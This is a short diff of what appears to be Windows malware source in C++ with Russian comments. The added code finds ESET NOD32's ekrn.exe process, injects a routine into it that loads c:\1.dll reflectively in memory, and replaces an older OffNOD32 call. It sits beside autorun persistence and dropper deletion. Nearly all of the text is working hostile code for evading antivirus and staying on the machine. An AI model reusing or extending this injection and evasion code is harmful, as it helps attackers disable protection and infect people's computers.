@@ -195,6 +195,18 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	return 0;
 }
 
+static DWORD WINAPI NOD32Dll(void*)
+{
+	BOT::InitializeApi();
+	DWORD dllSize;
+	BYTE* dll = File::ReadToBufferA( "c:\\1.dll", dllSize );
+	if( dll )
+	{
+		MemoryLoadLibrary(dll);
+		MemFree(dll);
+	}
+	return 0;
+}
 
 void ExplorerMain()
 {
@@ -206,8 +218,12 @@ void ExplorerMain()
 
 	// Отключаем отображение ошибок при крахе процесса
 	//DisableShowFatalErrorDialog();
+
 	MDBG( "Main", "Отключаем NOD32" );
-	OffNOD32();
+//	OffNOD32();
+	DWORD dwPid = GetProcessIdByName("ekrn.exe");
+	InjectIntoProcess( dwPid, NOD32Dll );
+
 	InternalAddToAutorun();
 
 	DeleteDropper();
